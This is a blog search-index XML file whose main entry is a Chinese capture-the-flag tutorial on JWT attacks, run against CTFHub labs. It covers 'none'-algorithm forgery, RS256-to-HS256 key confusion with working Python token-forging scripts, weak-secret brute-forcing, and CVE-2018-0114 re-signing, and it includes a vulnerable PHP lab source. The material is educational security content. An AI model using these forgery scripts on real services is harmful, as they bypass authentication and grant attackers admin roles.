<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>常用的JWT攻击手段</title>
      <link href="/jwtcrack/"/>
      <url>/jwtcrack/</url>
      
        <content type="html"><![CDATA[<h1 id="常用的JWT攻击手段"><a href="#常用的JWT攻击手段" class="headerlink" title="常用的JWT攻击手段"></a>常用的JWT攻击手段</h1><h2 id="1-什么是-jwt？"><a href="#1-什么是-jwt？" class="headerlink" title="1. 什么是 jwt？"></a>1. 什么是 jwt？</h2><blockquote><p><code>JSON Web Token</code> (<code>JWT</code>) is an open standard (<a href="https://tools.ietf.org/html/rfc7519">RFC 7519</a>) that defines a compact and self-contained way for securely transmitting information between parties as a JSON object. This information can be verified and trusted because it is digitally signed. JWTs can be signed using a secret (with the HMAC algorithm) or a public&#x2F;private key pair using RSA or ECDSA.</p><p><code>Jwt</code>是<code>JSON web Token</code>的缩写，它是为了在网络应用环境间传递声明而执行的一种基于JSON的开放式标准(<a href="https://tools.ietf.org/html/rfc7519">RFC 7519</a>)，该<code>token</code>被设计为紧凑且安全的，特别适用于分布式站点的单点登录(<code>SSO</code>)场景。JWT的声明一般被用在身份提供者和服务提供者间传递被认证的用户身份信息，以便于从资源服务器获取资源，也可以增加一些额外的业务逻辑所必须声明信息，该<code>token</code>也可被直接用于认证，也可用作加密。</p></blockquote><h2 id="2-jwt-的结构"><a href="#2-jwt-的结构" class="headerlink" title="2. jwt 的结构"></a>2. jwt 的结构</h2><blockquote><p>一个 <code>JWT</code> 包含三个部分:</p><ul><li><strong>Header</strong> <em>(头部)</em></li><li>由两部分组成：1. 签名算法 2. 类型（一般都是<code>jwt</code>  有：<code>JWT/JWS/JWE/JWK</code>等等）</li><li><strong>Payload</strong> <em>(数据部分)</em>: </li><li>包含声明或JSON对象</li><li><strong>Signature</strong> <em>(签名部分)</em>: </li><li>通过加密算法生成的字符串，可用于验证 JSON 负载的完整性 <em>(防篡改)</em></li></ul></blockquote><ul><li>结构示意图</li></ul><p><img src="/../static/jwtcrack/image-20221116105141053.png" alt="image-20221116105141053"></p><ul><li><a href="https://jwt.io/">在线JWT Debugger</a></li></ul><p><img src="/../static/jwtcrack/image-20221116105829431.png" alt="image-20221116105829431"></p><h2 id="3-攻击方法"><a href="#3-攻击方法" class="headerlink" title="3. 攻击方法"></a>3. 攻击方法</h2><h3 id="3-1-删除签名算法"><a href="#3-1-删除签名算法" class="headerlink" title="3.1 删除签名算法"></a>3.1 删除签名算法</h3><blockquote><p>一些JWT库也支持none算法，即不使用签名算法。当alg字段为空时，后端将不执行签名验证</p></blockquote><ul><li>例子： <a href="https://www.ctfhub.com/#/skilltree">CTFHUB技能树 -&gt;  JSON Web Token -&gt; 无签名 </a></li><li>打开靶场，可以看到登录框(<code>login.php</code>)，随便输入 <code>admin:123</code></li><li>跳到了<code>index.php</code></li></ul><blockquote><p>Hello admin(guest), only admin can get flag.</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Cookie:<span class="token assign-left variable">token</span><span class="token operator">=</span>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiIxMjMiLCJyb2xlIjoiZ3Vlc3QifQ.Gj5LcMKKCyWHpGmZHhUAzchUQp_9Lwp7LkM2O5g1Cso<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/../static/jwtcrack/image-20221116140256573.png" alt="image-20221116140256573"></p><ul><li><p>可以看到是算法是<code>HS256</code></p></li><li><p>把算法变成 <code>none</code>，把 <code>guest</code> 改成 <code>admin</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> jwtpayload<span class="token operator">=</span><span class="token punctuation">&#123;</span>  <span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string">"admin"</span><span class="token punctuation">,</span>  <span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token string">"123"</span><span class="token punctuation">,</span>  <span class="token string">"role"</span><span class="token punctuation">:</span> <span class="token string">"admin"</span><span class="token punctuation">&#125;</span>token <span class="token operator">=</span> jwt<span class="token punctuation">.</span>encode<span class="token punctuation">(</span>payload<span class="token punctuation">,</span>algorithm<span class="token operator">=</span><span class="token string">"none"</span><span class="token punctuation">,</span>key<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token comment"># b'eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiIxMjMiLCJyb2xlIjoiYWRtaW4ifQ.'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>提交<code>token</code> 即可获取<code>flag</code></p></li></ul><p><img src="/../static/jwtcrack/image-20221116140858914.png" alt="image-20221116140858914"></p><h3 id="3-2-修改签名算法"><a href="#3-2-修改签名算法" class="headerlink" title="3.2 修改签名算法"></a>3.2 修改签名算法</h3><blockquote><p>有些JWT库支持多种密码算法进行签名、验签。若目标使用非对称密码算法时，有时攻击者可以获取到公钥，此时可通过修改JWT头部的签名算法，将非对称密码算法改为对称密码算法，从而达到攻击者目的。</p></blockquote><ul><li><p>例子： <a href="https://www.ctfhub.com/#/skilltree">CTFHUB技能树 -&gt;  JSON Web Token -&gt; 修改签名算法 </a></p></li><li><p>题目源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">require</span> <span class="token constant">__DIR__</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/vendor/autoload.php'</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package"><span class="token punctuation">\</span>Firebase<span class="token punctuation">\</span>JWT<span class="token punctuation">\</span>JWT</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">JWTHelper</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function-definition function">encode</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$alg</span><span class="token operator">=</span><span class="token string single-quoted-string">'HS256'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token class-name static-context">JWT</span><span class="token operator">::</span><span class="token function">encode</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token variable">$alg</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function-definition function">decode</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token variable">$alg</span><span class="token operator">=</span><span class="token string single-quoted-string">'HS256'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">try</span><span class="token punctuation">&#123;</span>            <span class="token variable">$header</span> <span class="token operator">=</span> <span class="token class-name static-context">JWTHelper</span><span class="token operator">::</span><span class="token function">getHeader</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$algs</span> <span class="token operator">=</span> <span class="token function">array_merge</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$header</span><span class="token operator">-></span><span class="token property">alg</span><span class="token punctuation">,</span> <span class="token variable">$alg</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> <span class="token class-name static-context">JWT</span><span class="token operator">::</span><span class="token function">decode</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token variable">$algs</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token class-name">Exception</span> <span class="token variable">$e</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function-definition function">getHeader</span><span class="token punctuation">(</span><span class="token variable">$jwt</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$tks</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'.'</span><span class="token punctuation">,</span> <span class="token variable">$jwt</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">list</span><span class="token punctuation">(</span><span class="token variable">$headb64</span><span class="token punctuation">,</span> <span class="token variable">$bodyb64</span><span class="token punctuation">,</span> <span class="token variable">$cryptob64</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token variable">$tks</span><span class="token punctuation">;</span>        <span class="token variable">$header</span> <span class="token operator">=</span> <span class="token class-name static-context">JWT</span><span class="token operator">::</span><span class="token function">jsonDecode</span><span class="token punctuation">(</span><span class="token class-name static-context">JWT</span><span class="token operator">::</span><span class="token function">urlsafeB64Decode</span><span class="token punctuation">(</span><span class="token variable">$headb64</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$header</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$FLAG</span> <span class="token operator">=</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"FLAG"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$PRIVATE_KEY</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/privatekey.pem"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$PUBLIC_KEY</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"./publickey.pem"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REQUEST_METHOD'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'POST'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$token</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'admin'</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token variable">$FLAG</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$jwt_payload</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>                <span class="token string single-quoted-string">'username'</span> <span class="token operator">=></span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                <span class="token string single-quoted-string">'role'</span><span class="token operator">=></span> <span class="token string single-quoted-string">'admin'</span><span class="token punctuation">,</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$token</span> <span class="token operator">=</span> <span class="token class-name static-context">JWTHelper</span><span class="token operator">::</span><span class="token function">encode</span><span class="token punctuation">(</span><span class="token variable">$jwt_payload</span><span class="token punctuation">,</span> <span class="token variable">$PRIVATE_KEY</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'RS256'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$jwt_payload</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>                <span class="token string single-quoted-string">'username'</span> <span class="token operator">=></span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>                <span class="token string single-quoted-string">'role'</span><span class="token operator">=></span> <span class="token string single-quoted-string">'guest'</span><span class="token punctuation">,</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$token</span> <span class="token operator">=</span> <span class="token class-name static-context">JWTHelper</span><span class="token operator">::</span><span class="token function">encode</span><span class="token punctuation">(</span><span class="token variable">$jwt_payload</span><span class="token punctuation">,</span> <span class="token variable">$PRIVATE_KEY</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'RS256'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        @<span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"token"</span><span class="token punctuation">,</span> <span class="token variable">$token</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1800</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: /index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        @<span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"token"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: /index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'token'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token class-name static-context">JWTHelper</span><span class="token operator">::</span><span class="token function">decode</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'token'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$PUBLIC_KEY</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token class-name static-context">JWTHelper</span><span class="token operator">::</span><span class="token function">decode</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'token'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$PUBLIC_KEY</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token operator">-></span><span class="token property">role</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token variable">$FLAG</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>看源码可知本案例中支持 <code>RS256</code>  <em>(非对称加密)</em> 和 <code>HS256</code> <em>(对称加密)</em></p></li><li><p>如果将算法从 <code>RS256</code>  <em>(非对称加密)</em> 更改为 <code>HS256</code> <em>(对称加密)</em></p></li><li><p>此时会使用公钥作为密钥，然后使用<code>HS256</code>算法验证签名</p></li><li><p>题目给了 <code>publickey.pem</code> </p></li><li><p>注意最后的换行符</p></li><li><p>最好直接下载文件：<code>wget http://challenge-67854910bebecabd.sandbox.ctfhub.com:10800/publickey.pem</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">-----BEGIN PUBLIC KEY-----MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA4Dp4zqTkfklEPf4iuBlO4v+xnZ68RD+/A5ej/3hKh/Li7HTBZAgFmFKZJ9h+PQsEgZxj2joIm9LgN+usWQH1AMo8ZAgY/0a6AqSyGYZz6ZJqc8mWedrMuXldlmAN53lYZcd5DFQELp7Zm/afHblX6sbt8QgLol+ZUjLxIT1bOncSd7R2KgXaL1XZpi9W09HYefG/oOMmgiAF2v0eyDqx3nX4g2/ZNU7GHHtu82H6XO6aOGILOHRFQHhVYXGEK4HezYWMwaAzbDgm+NfWvBReAclu7uKiG3B5zwHj3t7f65APWcj0YWK5EGKt9T1sf7of9wp+QTe/yne2qnrFxQXKuwIDAQAB-----END PUBLIC KEY-----<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>然后改掉<code>payload</code>并使用公钥当作私钥使用<code>HS256</code>签名</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 这里注意只能只用旧版本PyJWT才能成功</span><span class="token comment"># pip install PyJWT == 0.4.3</span><span class="token keyword">import</span> jwt<span class="token keyword">import</span> base64public <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'publickey.pem'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>payload<span class="token operator">=</span><span class="token punctuation">&#123;</span>  <span class="token string">"username"</span><span class="token punctuation">:</span> <span class="token string">"admin"</span><span class="token punctuation">,</span>  <span class="token string">"role"</span><span class="token punctuation">:</span> <span class="token string">"admin"</span><span class="token punctuation">&#125;</span><span class="token keyword">print</span><span class="token punctuation">(</span>jwt<span class="token punctuation">.</span>encode<span class="token punctuation">(</span>payload<span class="token punctuation">,</span> key<span class="token operator">=</span>public<span class="token punctuation">,</span> algorithm<span class="token operator">=</span><span class="token string">'HS256'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'ascii'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>替代方案 <a href="https://security.stackexchange.com/questions/187265/jwt-encoding-using-hmac-with-asymmetric-key-as-secret">参考地址</a></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> hmac<span class="token keyword">import</span> hashlib<span class="token keyword">import</span> base64key <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'publickey.pem'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># Paste your header and payload here</span>header <span class="token operator">=</span> <span class="token string">'&#123;"typ": "JWT", "alg": "HS256"&#125;'</span>payload <span class="token operator">=</span> <span class="token string">'&#123;"username": "admin", "role": "admin"&#125;'</span><span class="token comment"># Creating encoded header</span>encodeHBytes <span class="token operator">=</span> base64<span class="token punctuation">.</span>urlsafe_b64encode<span class="token punctuation">(</span>header<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>encodeHeader <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>encodeHBytes<span class="token punctuation">,</span> <span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rstrip<span class="token punctuation">(</span><span class="token string">"="</span><span class="token punctuation">)</span><span class="token comment"># Creating encoded payload</span>encodePBytes <span class="token operator">=</span> base64<span class="token punctuation">.</span>urlsafe_b64encode<span class="token punctuation">(</span>payload<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>encodePayload <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>encodePBytes<span class="token punctuation">,</span> <span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rstrip<span class="token punctuation">(</span><span class="token string">"="</span><span class="token punctuation">)</span><span class="token comment"># Concatenating header and payload</span>token <span class="token operator">=</span> <span class="token punctuation">(</span>encodeHeader <span class="token operator">+</span> <span class="token string">"."</span> <span class="token operator">+</span> encodePayload<span class="token punctuation">)</span><span class="token comment"># Creating signature</span>sig <span class="token operator">=</span> base64<span class="token punctuation">.</span>urlsafe_b64encode<span class="token punctuation">(</span>hmac<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token builtin">bytes</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> <span class="token string">"UTF-8"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> token<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"UTF-8"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>rstrip<span class="token punctuation">(</span><span class="token string">"="</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>token <span class="token operator">+</span> <span class="token string">"."</span> <span class="token operator">+</span> sig<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>执行上面任意一个脚本，重新生成一个 <code>jwt</code> 提交过去就能拿到 <code>flag</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python RS256ToHS256.pyeyJ0eXAiOiAiSldUIiwgImFsZyI6ICJIUzI1NiJ9.eyJ1c2VybmFtZSI6ICJhZG1pbiIsICJyb2xlIjogImFkbWluIn0.I70Rt1kObCgHD17xVx0nZfVv59wEU99nMkxQAcxEO_s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ul><p><img src="/../static/jwtcrack/image-20221116115605272.png" alt="image-20221116115605272"></p><h3 id="3-3-密钥爆破"><a href="#3-3-密钥爆破" class="headerlink" title="3.3 密钥爆破"></a>3.3 密钥爆破</h3><blockquote><p>如果JWT采用对称加密算法，并且密钥的强度较弱的话，攻击者可以直接通过蛮力攻击方式来破解密钥</p></blockquote><ul><li><p>例子： <a href="https://www.ctfhub.com/#/skilltree">CTFHUB技能树 -&gt;  JSON Web Token -&gt; 弱密钥 </a></p></li><li><p>打开靶场界面操作和<code>#3.1</code>一样</p></li><li><p>得到 <code>jwt</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiIxMjMiLCJyb2xlIjoiZ3Vlc3QifQ.eaa6uYl_c6JJNfsQmyN6ugEekJt3zIqCUDrtXOA9-QE<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>但是尝试删除签名算法无果</p></li><li><p>尝试爆破密钥</p></li><li><p>可以使用 <a href="https://github.com/brendan-rius/c-jwt-cracker">c-jwt-cracker</a></p></li><li><p>也可使用 <a href="https://github.com/Ch1ngg/JWTPyCrack">https://github.com/Ch1ngg/JWTPyCrack</a> （这个需要自己提供字典）</p></li></ul><p><img src="/../static/jwtcrack/image-20221116143033064.png" alt="image-20221116143033064"></p><ul><li>爆破得到密钥  <code>izfx</code></li></ul><p>到 <a href="https://jwt.io/">jwt.io</a> 上篡改</p><p><img src="/../static/jwtcrack/image-20221116143301891.png" alt="image-20221116143301891"></p><ul><li>得到新的 <code>jwt</code></li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiIxMjMiLCJyb2xlIjoiYWRtaW4ifQ.c0KJ61hB2OJE4yKBouD_t_Lp_jO2OuitkfUrV7lUohk<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>提交即可得到 <code>flag</code></li></ul><p><img src="/../static/jwtcrack/image-20221116143420846.png" alt="image-20221116143420846"></p><h3 id="3-4-提交错误数据"><a href="#3-4-提交错误数据" class="headerlink" title="3.4 提交错误数据"></a>3.4 提交错误数据</h3><blockquote><p>当一些配置不当开了 <code>debug</code> 的网站提交错误的数据导致 <code>jwt</code>签名错误可能会爆出密钥</p><p><a href="https://github.com/jwt-dotnet/jwt/issues/61">https://github.com/jwt-dotnet/jwt/issues/61</a></p><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2019-7644">CVE-2019-7644</a></p></blockquote><h3 id="3-5-重签名"><a href="#3-5-重签名" class="headerlink" title="3.5 重签名"></a>3.5 重签名</h3><blockquote><p>攻击者可以在令牌中提供自己的密钥，然后API会使用该密钥进行验证！<br><a href="https://nvd.nist.gov/vuln/detail/CVE-2018-0114">CVE-2018-0114</a><br>该漏洞是由于遵循JSON Web令牌（JWT）的JSON Web签名（JWS）标准而导致的节点丢失。该标准指定可以将表示公共密钥的JSON Web密钥（JWK）嵌入JWS的标头中。然后将此公钥信任进行验证。攻击者可以通过以下方法来伪造有效的JWS对象：删除原始签名，向标头添加新的公钥，然后使用与该JWS标头中嵌入的公钥关联的（攻击者拥有的）私钥对对象进行签名，从而利用此漏洞<br>利用脚本<a href="https://www.exploit-db.com/exploits/44324">https://www.exploit-db.com/exploits/44324</a></p></blockquote><h2 id="4-参考链接"><a href="#4-参考链接" class="headerlink" title="4. 参考链接"></a>4. 参考链接</h2><blockquote><p><a href="https://jwt.io/">https://jwt.io/</a></p><p><a href="https://www.ctfhub.com/">https://www.ctfhub.com/</a></p><p><a href="https://blog.csdn.net/weixin_39997829/article/details/114003358">https://blog.csdn.net/weixin_39997829/article/details/114003358</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> skills </tag>
            
            <tag> jwt </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nmap扫描工具的使用</title>
      <link href="/nmap/"/>
      <url>/nmap/</url>
      
